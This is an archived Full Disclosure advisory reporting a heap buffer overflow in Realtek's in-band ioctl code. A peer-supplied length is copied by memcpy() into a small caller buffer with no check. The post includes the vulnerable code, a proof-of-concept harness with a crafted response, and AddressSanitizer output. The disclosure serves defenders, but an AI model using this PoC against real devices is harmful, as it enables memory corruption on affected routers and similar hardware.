---
title: Realtek edimax 52fc10d19 In-Band Ioctl Response Length Confusion Causes Heap Buffer Overflow
url: https://seclists.org/fulldisclosure/2026/Aug/105
source: Full Disclosure
date: 2026-08-26
fetch_date: 2026-08-27T12:14:26.110303
---

# Realtek edimax 52fc10d19 In-Band Ioctl Response Length Confusion Causes Heap Buffer Overflow

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](104)
[By Date](date.html#105)
[![Next](/images/right-icon-16x16.png)](106)

[![Previous](/images/left-icon-16x16.png)](104)
[By Thread](index.html#105)
[![Next](/images/right-icon-16x16.png)](106)

![](/shared/images/nst-icons.svg#search)

# Realtek edimax 52fc10d19 In-Band Ioctl Response Length Confusion Causes Heap Buffer Overflow

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sat, 22 Aug 2026 08:43:31 -0400

---

```
The Realtek in-band ioctl bridge contains a heap-buffer overflow when
processing peer-supplied ioctl response data.

inband_ioctl() receives a response through the Realtek in-band transport
and extracts a 32-bit data_get_len value from that response. For several
wireless "get" operations, this peer-controlled value is subsequently used
directly as the length argument to memcpy().

For SIOCGIWSCAN, the destination is a caller-provided buffer referenced
through local_iwr->u.data.pointer.

Although the caller supplies the destination capacity in
local_iwr->u.data.length, the function overwrites that value with the
peer-controlled data_get_len before validating whether the returned data
fits the destination.

As a result, a malicious or compromised in-band peer capable of supplying
an oversized response length can cause inband_ioctl() to copy more data
than the caller's destination buffer can contain.

The supplied PoC creates an *8-byte caller buffer* and returns a
peer-controlled data_get_len of *64 bytes*. The original inband_ioctl()
implementation consequently performs a *64-byte **memcpy()** into the
8-byte heap allocation*.

AddressSanitizer confirms the resulting heap-buffer overflow.
Vulnerable Code

The response length is extracted from the received in-band data:

memcpy(
    &data_get_len,
    rx_buf + INBAND_IOCTLHDR_LEN + IWREQ_LEN + ext_len,
    4
);

data_get_len = ntohl(data_get_len);

data_get_ptr =
    (char *)(
        rx_buf +
        INBAND_IOCTLHDR_LEN +
        IWREQ_LEN +
        ext_len +
        4
    );

For SIOCGIWSCAN, the implementation subsequently performs:

case SIOCGIWSCAN:
    local_iwr = (struct iwreq *)req;
    local_iwr->u.data.length = data_get_len;
    memcpy(
        local_iwr->u.data.pointer,
        data_get_ptr,
        data_get_len
    );
    break;

The response controls data_get_len, but no validation ensures that:

data_get_len <= caller_destination_capacity

before the copy.
Root Cause

The caller initially provides both:

u.data.pointer -> destination buffer
u.data.length  -> destination capacity

However, inband_ioctl() performs:

local_iwr->u.data.length = data_get_len;

before validating the response.

This destroys the original caller-provided capacity information.

The subsequent copy becomes conceptually equivalent to:

size_t attacker_len = response.data_get_len;

local_iwr->u.data.length = attacker_len;

memcpy(
    caller_buffer,
    response_data,
    attacker_len
);

No reliable information about the actual destination capacity remains
available at the point of the copy.

The implementation also does not sufficiently establish that the received
response itself contains data_get_len bytes following the response-length
field.
Proof of Concept

The validation harness compiles the original source:

#include "../../../package/librtk-inband/src/hapd_api.c"

and stubs only the lower in-band transport functions.

The simulated peer response contains:

static unsigned char rx_buf[6 + 32 + 4 + 128];

int ret = htonl(0);
int attacker_len = htonl(64);

memcpy(rx_buf, &ret, sizeof(ret));

memcpy(
    rx_buf + 6 + 32,
    &attacker_len,
    sizeof(attacker_len)
);

memset(
    rx_buf + 6 + 32 + 4,
    'A',
    64
);

The caller allocates only:

small_destination = malloc(8);

req.u.data.pointer = small_destination;
req.u.data.length = 8;

and invokes the original vulnerable function:

inband_ioctl(SIOCGIWSCAN, &req);

The resulting state is:

Caller destination capacity:      8 bytes
Peer-controlled data_get_len:   64 bytes
memcpy() length:                    64 bytes
                                             ------------
Overflow beyond destination:    56 bytes

The vulnerable memcpy() is executed by the original inband_ioctl()
implementation.
AddressSanitizer Evidence

AddressSanitizer confirms the out-of-bounds heap write:

ERROR: AddressSanitizer: heap-buffer-overflow

WRITE of size 64

    #1 ... inband_ioctl
    package/librtk-inband/src/hapd_api.c:403

    #2 ... main
    src/poc_inband_ioctl_response_overflow.c:80

0x... is located 0 bytes after 8-byte region

allocated by thread T0 here:

    #1 ... main
    src/poc_inband_ioctl_response_overflow.c:70

The sanitizer evidence therefore directly establishes:

Destination allocation:    8 bytes
Write size:               64 bytes
Overflow:                 56 bytes
Vulnerable function:      inband_ioctl()
Result:                   CONFIRMED

Additional Affected Operations

The same response-copy pattern is present in additional wireless get
operations in the affected block, including:

SIOCGIWESSID
SIOCGIWRANGE
SIOCGIWAP

The exact destination differs between operations, but the security issue is
structurally similar: a length originating from the in-band response is
used to control a memory copy without first validating it against the
destination capacity.

These additional operations should be audited and individually
regression-tested as part of remediation.
Security Impact

The demonstrated primitive is an out-of-bounds heap write into a
caller-provided ioctl result buffer.

In the validated case, the response causes *64 bytes to be written into an
8-byte allocation*, corrupting 56 bytes beyond the destination.

Potential consequences include:

   - process termination;
   - corruption of adjacent heap objects;
   - corruption of management or wireless-control process state; and
   - potentially more significant memory corruption depending on allocator
   layout and target hardening.

The current PoC validates the memory-corruption primitive in the original
inband_ioctl() implementation while stubbing the underlying in-band
transport. It does not independently establish a complete network
exploitation chain or arbitrary code execution.

Ron Edgerson
Vulnerability Researcher & Exploit Developer

CVE Research | Binary Exploitation | Application & Systems Security
Responsible Disclosure • Proof-of-Concept Development

🌐 https://github.com/ob1sec
🔗 https://www.linkedin.com/in/ronedgerson1
<https://linkedin.com/in/yourhandle>
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](104)
[By Date](date.html#105)
[![Next](/images/right-icon-16x16.png)](106)

[![Previous](/images/left-icon-16x16.png)](104)
[By Thread](index.html#105)
[![Next](/images/right-icon-16x16.png)](106)

### Current thread:

* **Realtek edimax 52fc10d19 In-Band Ioctl Response Length Confusion Causes Heap Buffer Overflow** *Ron E (Aug 26)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs...